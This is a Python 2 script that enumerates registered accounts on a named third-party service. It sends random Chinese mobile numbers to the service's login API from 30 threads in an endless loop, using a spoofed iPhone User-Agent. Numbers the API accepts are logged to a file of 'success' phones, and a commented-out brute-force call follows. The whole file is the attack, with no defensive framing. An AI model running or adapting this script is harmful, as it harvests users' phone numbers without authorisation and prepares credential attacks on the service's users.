#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150316


import json
import random
import requests
import threadpool as tp





def _status(args):
    flag = 0
    while True:
        flag += 1
        phone_number = random.choice(['188','185','158','153','186','136','139','135'])\
                       +"".join(random.sample("0123456789",8 ))
        data = {'UserName': phone_number,
        }
        headers = {'content-type':'application/x-www-form-urlencoded; charset=utf-8',
                    'User-Agent':'1.4.12 (iPhone; iPhone OS 7.1.4; zh_CN)',
        }

        api_url = 'http://restfulapi.dding.net/login1?'
        try:
            print '[%s] Test Phone: %s' % (flag, phone_number)
            req = requests.post(api_url, data=data, headers=headers,timeout=3)
            req_status = json.loads(req.content)['ErrNo']
        except:
            req_status = 4003
        if req_status == 0:
            success_f = open('./dd_success_reg_phone.txt', 'a+')
            success_f.write('%s\n'%phone_number)
            success_f.close()
            #_burp(phone_number)
            print '\n[OK] Phone: %s\n' % phone_number


if __name__ == '__main__':
    args = []
    for i in range(30):
        args.append(args)
    pool = tp.ThreadPool(30)
    reqs = tp.makeRequests(_status, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()